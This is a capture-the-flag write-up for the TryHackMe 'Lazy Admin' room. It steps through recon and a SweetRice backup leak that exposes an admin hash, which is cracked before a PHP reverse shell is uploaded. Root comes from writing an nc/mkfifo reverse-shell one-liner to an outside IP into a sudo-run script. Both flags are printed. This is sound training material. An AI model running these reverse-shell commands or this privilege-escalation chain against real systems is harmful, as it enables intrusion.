---
title: "Lazy Admin - TryHackMe"
author: Ludovic COULON
date: 2020-05-18
hero: ./images/hero.jpeg
excerpt: "Writeup for the Lazy Admin room on TryHackMe"
---

[TryHackMe | Lazy Admin](https://tryhackme.com/room/lazyadmin)

Have some fun! There might be multiple ways to get user access.

`Note: It might take 2-3 minutes for the machine to boot`

### Setup

```bash
nmap -A -vv 10.10.92.243
```

```bash
22/tcp   open     ssh        syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm

80/tcp   open     http       syn-ack     Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1352/tcp filtered lotusnotes no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜  TryHackMe dirb http://10.10.92.243 -R # -R for recursive attack
```

```bash
http://10.10.92.243/content/
```

<div className="Image__Medium">
  <img src="https://imgur.com/BqsPQQJ.png" alt="blog_image" />
</div>

Let's find on searchsploit if there is some exploit for this version of CMS

```bash
➜  TryHackMe searchsploit SweetRice
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                      | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                   | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                    | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                      | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                          | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                 | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Exec | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload        | php/webapps/14184.txt
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's try this one

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/40718)

<div className="Image__Medium">
  <img src="https://imgur.com/9fsvVsS.png" alt="blog_image" />
</div>

There you go ! We have an sql backup let's see the content of it.

```sql
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
  3 => 'CREATE TABLE `%--%_category` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `link` varchar(128) NOT NULL,
  `title` text NOT NULL,
  `description` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `sort_word` text NOT NULL,
  `parent_id` int(10) NOT NULL DEFAULT \'0\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `link` (`link`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
  5 => 'CREATE TABLE `%--%_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT \'\',
  `email` varchar(255) NOT NULL DEFAULT \'\',
  `website` varchar(255) NOT NULL,
  `info` text NOT NULL,
  `post_id` int(10) NOT NULL DEFAULT \'0\',
  `post_name` varchar(255) NOT NULL,
  `post_cat` varchar(128) NOT NULL,
  `post_slug` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `ip` varchar(39) NOT NULL DEFAULT \'\',
  `reply_date` int(10) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
  7 => 'CREATE TABLE `%--%_item_data` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `data_type` varchar(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`),
  KEY `item_type` (`item_type`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
  9 => 'CREATE TABLE `%--%_item_plugin` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
  11 => 'CREATE TABLE `%--%_links` (
  `lid` int(10) NOT NULL AUTO_INCREMENT,
  `request` text NOT NULL,
  `url` text NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
  13 => 'CREATE TABLE `%--%_options` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` mediumtext NOT NULL,
  `date` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>
```

```bash
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{
s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";
s:10:\\"Lazy Admin\\"
s:5:\\"title\\";
s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";
s:11:\\"Description\\";
s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\
"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
```

Let's crack the hash of the Lazy admin

```bash
42f749ade7f9e195bf475f37a44cafcb
Password123
```

<div className="Image__Medium">
  <img src="https://imgur.com/PVV4IhF.png" alt="blog_image" />
</div>

```bash
➜  TryHackMe dirb http://10.10.92.243/content -R
```

```bash
➜  TryHackMe dirb http://10.10.92.243/content -R

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon May 18 17:22:57 2020
URL_BASE: http://10.10.92.243/content/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Interactive Recursion

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.92.243/content/ ----
==> DIRECTORY: http://10.10.92.243/content/_themes/
==> DIRECTORY: http://10.10.92.243/content/as/ <-
==> DIRECTORY: http://10.10.92.243/content/attachment/
```

<div className="Image__Medium">
  <img src="https://imgur.com/ifVqzYr.png" alt="blog_image" />
</div>

```bash
Account :
manager:Password123 # We cracked the hash earlier
```

<div className="Image__Medium">
  <img src="https://imgur.com/buDQ4GO.png" alt="blog_image" />
</div>

Let's upload or own reverse shell on the server !

[pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

<div className="Image__Medium">
  <img src="https://imgur.com/57U4BDw.png" alt="blog_image" />
</div>

### #1 What is the user flag?

```bash
$ import pty; pty.spawn("/bin/sh")
/bin/sh: 1: Syntax error: word unexpected (expecting ")")
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

### #2 What is the root flag?

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.228 5555 >/tmp/f" > /etc/copy.sh
```

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
➜  TryHackMe nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.9.2.228] from (UNKNOWN) [10.10.92.243] 56684
/bin/sh: 0: cant access tty; job control turned off
$ cd /root/
$ ls
root.txt
$ cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/tpmhPhO.png" alt="TryhackMeProfile" />
  </a>
</center>
